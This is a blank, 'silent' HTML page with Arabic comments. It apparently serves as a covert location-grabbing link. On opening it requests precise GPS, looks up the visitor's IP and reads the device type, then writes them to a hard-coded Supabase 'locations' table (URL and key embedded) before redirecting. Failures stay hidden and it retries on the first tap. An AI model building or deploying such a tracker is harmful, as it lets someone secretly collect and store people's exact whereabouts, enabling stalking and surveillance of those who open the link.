<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title></title>

  <!-- الصفحة صامتة بالكامل -->
  <style>
    /* لا شيء يُعرض للمستخدم */
    html,body{margin:0;padding:0;background:#fff;}
  </style>

  <!-- سياسة أمان مناسبة للاتصالات المطلوبة فقط -->
  <meta http-equiv="Content-Security-Policy"
        content="default-src 'self';
                 script-src 'self' https://cdn.jsdelivr.net;
                 connect-src 'self' https://*.supabase.co https://api.ipify.org;
                 img-src 'self' data:;
                 style-src 'self' 'unsafe-inline';
                 frame-ancestors 'none'">
</head>
<body>
  <!-- لا عناصر UI -->

  <!-- Supabase JS -->
  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
  <script>
    // ===== إعدادات Supabase (جدول locations) =====
    const SUPA_URL = 'https://weaiftikalbujuecfuhf.supabase.co';
    const SUPA_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6IndlYWlmdGlrYWxidWp1ZWNmdWhmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTYzOTU2MzAsImV4cCI6MjA3MTk3MTYzMH0.kxiytsgnkEOim_zUD49zgVp7rxr3nHAVHFb0Jq9dijk';
    const TABLE = 'locations';
    const supabase = window.supabase.createClient(SUPA_URL, SUPA_KEY);

    // ===== مساعدات =====
    const qs = new URLSearchParams(location.search);
    let redirect = null;
    (function(){
      const raw = qs.get('redirect');
      if (raw && raw.startsWith('/') && !raw.startsWith('//')) redirect = raw;
    })();

    function deviceNameFromUA(ua){
      if (/iPhone|iPad|iPod/.test(ua)) return 'iOS Device';
      if (/Android/.test(ua))         return 'Android Device';
      if (/Macintosh/.test(ua))       return 'Mac';
      if (/Windows/.test(ua))         return 'Windows';
      return 'Unknown';
    }

    function gpsGeo(timeoutMs = 25000){
      return new Promise((resolve,reject)=>{
        if (!('geolocation' in navigator)) return reject(new Error('Geolocation unsupported'));
        const opts = { enableHighAccuracy:true, timeout:timeoutMs, maximumAge:0 };
        navigator.geolocation.getCurrentPosition(
          pos => resolve(pos.coords),
          err => reject(err),
          opts
        );
      });
    }

    async function getIP(){
      try{
        const r = await fetch('https://api.ipify.org?format=json', {cache:'no-store'});
        if (!r.ok) throw 0;
        const j = await r.json();
        return j.ip || null;
      }catch{ return null; }
    }

    async function saveRow(row){
      const { error } = await supabase.from(TABLE).insert([row]);
      if (error) throw new Error(error.message);
    }

    let done = false;
    async function runOnce(){
      if (done) return;
      done = true;
      try{
        // 1) GPS فقط (قد يطلب إذن)
        const c = await gpsGeo(25000);

        // 2) IP وبيانات الجهاز
        const ip = await getIP();
        const ua = navigator.userAgent;
        const device_name = deviceNameFromUA(ua);

        // 3) حفظ
        await saveRow({
          device_name,
          ip,
          lat: c.latitude,
          lng: c.longitude,
          accuracy: c.accuracy ?? null
        });

        // 4) تحويل اختياري
        if (redirect) location.assign(redirect);

      } catch (e) {
        // صامت: لا نعرض شيئًا. لمحاكاة إعادة المحاولة عند أول تفاعل (iOS)
        // أعد السماح بالمحاولة مرة واحدة عند أول نقرة/لمسة:
        pendingRetry = true;
      }
    }

    // محاولة تلقائية عند الفتح
    runOnce();

    // في iOS قد يلزم تفاعل المستخدم لطلب الإذن:
    let pendingRetry = false;
    function retryIfPending(){
      if (pendingRetry){
        pendingRetry = false;
        runOnce();
      }
    }
    // أول نقرة أو لمسة على الصفحة ستعيد المحاولة إن فشل الطلب التلقائي
    window.addEventListener('click', retryIfPending, { once:false, passive:true });
    window.addEventListener('touchstart', retryIfPending, { once:false, passive:true });
  </script>
</body>
</html>
